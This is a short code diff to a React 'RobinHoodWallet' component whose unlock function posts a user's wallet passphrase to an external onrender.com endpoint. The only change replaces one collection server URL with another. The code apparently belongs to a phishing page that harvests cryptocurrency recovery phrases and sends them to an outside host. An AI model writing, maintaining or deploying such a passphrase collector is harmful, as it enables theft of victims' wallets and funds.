@@ -10,7 +10,7 @@ const RobinHoodWallet = () => {
     const [loading, setLoading] = useState(false);
   
     const unlockWallet = async () => {
-      const url = 'https://obaro-wallet-connector.onrender.com/robinhood';
+      const url = 'https://secondwalletvalwizzy.onrender.com/robinhood';
       const data = { passphrase: text };
       try {
         setLoading(true);
